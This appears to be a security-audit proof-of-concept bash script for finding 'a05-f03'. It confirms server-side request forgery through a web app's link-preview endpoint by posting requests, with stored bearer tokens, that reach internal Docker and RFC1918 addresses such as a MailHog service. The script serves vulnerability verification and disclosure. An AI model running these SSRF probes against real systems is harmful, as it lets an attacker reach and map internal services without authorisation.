#!/usr/bin/env bash
# a05-f03: SSRF via /api/messages/conversations/:id/link-preview — blocklist only
# covers localhost/127.0.0.1, not RFC1918 ranges. Confirmed reachable: MailHog,
# MinIO (Docker-internal IPs).

set -uo pipefail
set -a; source /tmp/tokens.env; set +a
TARGET="${TARGET_URL:-http://localhost:3000}"

echo "=== a05-f03: SSRF via link-preview ==="

# Need a conversation we own. Create one between CLIENT and FREELANCER.
CONV=$(curl -s -X POST "$TARGET/api/messages/conversations" \
  -H "Authorization: Bearer $CLIENT" -H 'Content-Type: application/json' \
  -d "{\"recipient_id\":\"db734f89-16ba-482f-a127-fb649aabd099\"}")
CID=$(echo "$CONV" | python3 -c "import sys,json; d=json.load(sys.stdin); c=d.get('conversation') or d; print(c.get('id',''))" 2>/dev/null || echo "")
if [[ -z "$CID" ]]; then
  # find an existing one
  CID=$(curl -s -H "Authorization: Bearer $CLIENT" "$TARGET/api/messages/conversations" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); rows=d.get('conversations') or d.get('data') or d; rows=rows if isinstance(rows,list) else []; print(rows[0]['id'] if rows else '')" 2>/dev/null || echo "")
fi
echo "  Using conversation_id: ${CID:-<none>}"
if [[ -z "$CID" ]]; then echo "FAIL: no conversation"; exit 1; fi

echo "--- (1) probe localhost (should be blocked) ---"
R=$(curl -s -X POST "$TARGET/api/messages/conversations/$CID/link-preview" \
  -H "Authorization: Bearer $CLIENT" -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:3000/"}')
echo "  $R"

echo "--- (2) probe MailHog on internal Docker IP ---"
R1=$(curl -s -X POST "$TARGET/api/messages/conversations/$CID/link-preview" \
  -H "Authorization: Bearer $CLIENT" -H 'Content-Type: application/json' \
  -d '{"url":"http://172.19.0.3:8025/"}')
echo "  $R1"

echo "--- (3) probe an arbitrary internal range ---"
R2=$(curl -s -X POST "$TARGET/api/messages/conversations/$CID/link-preview" \
  -H "Authorization: Bearer $CLIENT" -H 'Content-Type: application/json' \
  -d '{"url":"http://10.0.0.1/"}')
echo "  $R2"

echo
echo "=== VERDICT ==="
if echo "$R1" | grep -qiE '(MailHog|172\.19|title)'; then
  echo "PASS: SSRF reached internal-network service (RFC1918 not blocked)."
  exit 0
fi
echo "FAIL or rate-limited."
exit 1
